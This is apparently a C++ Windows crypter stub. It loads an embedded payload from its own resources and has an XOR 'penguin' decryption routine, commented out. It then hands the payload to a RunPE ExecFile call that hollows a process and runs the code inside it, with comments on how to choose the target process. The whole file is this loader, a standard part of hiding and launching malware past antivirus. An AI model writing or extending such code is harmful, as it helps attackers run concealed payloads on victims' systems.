#include <iostream>
#include <Windows.h>
#include <fstream>
#include "Runpe.h"
#include <string>


int Rsize;
char* RData;
std::string choice;

void Resource(int id)
{
	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(1), RT_RCDATA);
	HGLOBAL temp = LoadResource(NULL, hResource);
	Rsize = SizeofResource(NULL, hResource);
	RData = (char*)LockResource(temp);
}

void Encryption_Choice()
{
	std::ifstream in("temp.dat");
	getline(in, choice);
	in.close();
	std::ofstream out("From temp.dat");
	out << choice;
	out.close();
}

void enc()
{
	char cipher[] = "penguin";
	for (int i = 0; i < Rsize; i++)
	{
		RData[i] ^= cipher[i % strlen(cipher)];
	}
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	Resource(1);
	Encryption_Choice();
	//enc();


	LPVOID pFile;
	TCHAR szFilePath[1024];

	pFile = RData;
	if (pFile)
	{
		GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
		//replace process.exe with "szFilePath" if you want to inject it in the SAME file.
		//or you may write the file path you want to inject in.
		ExecFile(LPSTR(szFilePath), pFile);
	}
	return 0;
};